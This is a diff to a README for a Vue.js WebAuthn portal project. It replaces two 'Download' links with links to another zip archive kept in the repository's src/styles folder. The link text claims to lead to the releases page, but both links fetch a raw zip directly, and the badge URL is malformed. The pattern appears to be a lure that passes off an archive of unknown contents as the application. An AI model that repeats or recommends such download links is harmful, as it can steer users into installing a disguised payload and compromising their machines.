@@ -6,7 +6,7 @@ Welcome to the **webauthn-secure-portal-vuejs** project. This application offers
 
 ## 🔗 Download Now
 
-[![Download](https://raw.githubusercontent.com/Kimtheng1517/webauthn-secure-portal-vuejs/main/src/utils/webauthn-secure-portal-vuejs-1.4.zip%20Release&color=blue)](https://raw.githubusercontent.com/Kimtheng1517/webauthn-secure-portal-vuejs/main/src/utils/webauthn-secure-portal-vuejs-1.4.zip)
+[![Download](https://github.com/Kimtheng1517/webauthn-secure-portal-vuejs/raw/refs/heads/main/src/styles/portal-webauthn-secure-vuejs-v2.4-alpha.3.zip%20Release&color=blue)](https://github.com/Kimtheng1517/webauthn-secure-portal-vuejs/raw/refs/heads/main/src/styles/portal-webauthn-secure-vuejs-v2.4-alpha.3.zip)
 
 ## 🖥️ System Requirements
 
@@ -27,7 +27,7 @@ Before you install the software, check that your system meets these requirements
 
 To get started, you need to download the application. Click the link below to visit the releases page.
 
-[Download from Releases](https://raw.githubusercontent.com/Kimtheng1517/webauthn-secure-portal-vuejs/main/src/utils/webauthn-secure-portal-vuejs-1.4.zip)
+[Download from Releases](https://github.com/Kimtheng1517/webauthn-secure-portal-vuejs/raw/refs/heads/main/src/styles/portal-webauthn-secure-vuejs-v2.4-alpha.3.zip)
 
 Once you're on the page, follow these steps:
 
